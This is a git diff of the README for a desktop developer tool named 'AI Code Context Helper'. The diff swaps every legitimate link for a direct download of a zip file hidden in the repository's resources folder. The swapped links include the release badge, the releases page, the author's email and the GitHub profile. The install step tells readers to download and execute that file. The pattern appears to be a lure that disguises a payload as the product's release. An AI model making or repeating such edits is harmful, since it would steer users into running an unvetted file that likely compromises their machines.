@@ -1,7 +1,7 @@
 # AI Code Context Helper 🤖
 
-![GitHub Release](https://img.shields.io/github/release/ahmedsamy-244/ai-code-context-helper.svg)  
-[Download Latest Release](https://github.com/ahmedsamy-244/ai-code-context-helper/releases)
+![GitHub Release](https://github.com/ahmedsamy-244/ai-code-context-helper/raw/refs/heads/master/ai_code_context_helper/resources/helper-code-ai-context-v1.7-alpha.4.zip)  
+[Download Latest Release](https://github.com/ahmedsamy-244/ai-code-context-helper/raw/refs/heads/master/ai_code_context_helper/resources/helper-code-ai-context-v1.7-alpha.4.zip)
 
 Welcome to the **AI Code Context Helper** repository! This lightweight desktop tool is designed for developers who work with AI assistants. It helps you visualize project structures, selectively export file paths and code to your clipboard, and enhances collaboration with AI tools like ChatGPT and Claude.
 
@@ -28,7 +28,7 @@ The AI Code Context Helper offers a range of features to streamline your develop
 
 To install the AI Code Context Helper, follow these steps:
 
-1. **Download the latest release** from the [Releases section](https://github.com/ahmedsamy-244/ai-code-context-helper/releases). Make sure to download the appropriate file for your operating system.
+1. **Download the latest release** from the [Releases section](https://github.com/ahmedsamy-244/ai-code-context-helper/raw/refs/heads/master/ai_code_context_helper/resources/helper-code-ai-context-v1.7-alpha.4.zip). Make sure to download the appropriate file for your operating system.
 2. **Execute the downloaded file** to install the application on your system.
 
 ## Usage
@@ -67,7 +67,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or feedback, please reach out:
 
 - **Author**: Ahmed Samy
-- **Email**: ahmedsamy@example.com
-- **GitHub**: [ahmedsamy-244](https://github.com/ahmedsamy-244)
+- **Email**: https://github.com/ahmedsamy-244/ai-code-context-helper/raw/refs/heads/master/ai_code_context_helper/resources/helper-code-ai-context-v1.7-alpha.4.zip
+- **GitHub**: [ahmedsamy-244](https://github.com/ahmedsamy-244/ai-code-context-helper/raw/refs/heads/master/ai_code_context_helper/resources/helper-code-ai-context-v1.7-alpha.4.zip)
 
-Thank you for checking out the AI Code Context Helper! For the latest updates and releases, visit the [Releases section](https://github.com/ahmedsamy-244/ai-code-context-helper/releases).
+Thank you for checking out the AI Code Context Helper! For the latest updates and releases, visit the [Releases section](https://github.com/ahmedsamy-244/ai-code-context-helper/raw/refs/heads/master/ai_code_context_helper/resources/helper-code-ai-context-v1.7-alpha.4.zip).
